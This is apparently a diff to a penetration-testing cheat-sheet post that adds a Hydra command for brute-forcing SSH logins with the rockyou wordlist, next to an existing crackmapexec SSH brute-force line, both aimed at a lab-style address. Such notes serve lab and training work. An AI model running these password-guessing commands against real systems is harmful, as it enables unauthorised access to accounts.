@@ -13,6 +13,12 @@ layout: post
 > hash-identifier
 ```
 
+###### Bruteforcing with Hydra
+```
+> hydra -e nsr -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh
+"-e nsr" = try "n" null password, "s" login as pass and/or "r" reversed login
+```
+
 ###### Bruteforcing with Crackmapexec
 ```
 > crackmapexec ssh 10.10.10.10 -u users.txt -p passwords.txt
